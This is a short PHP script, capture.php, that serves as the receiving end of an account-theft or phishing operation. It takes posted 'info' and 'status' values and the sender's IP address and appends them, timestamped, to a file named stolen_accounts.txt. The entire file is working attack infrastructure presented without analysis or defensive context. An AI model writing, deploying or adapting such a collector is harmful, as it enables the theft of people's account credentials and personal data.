<?php
// capture.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $info = $_POST['info'];
    $status = $_POST['status'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $entry = "[" . date("Y-m-d H:i:s") . "] [$status] IP: $ip | Data: $info" . PHP_EOL;
    file_put_contents("stolen_accounts.txt", $entry, FILE_APPEND);
}
?>
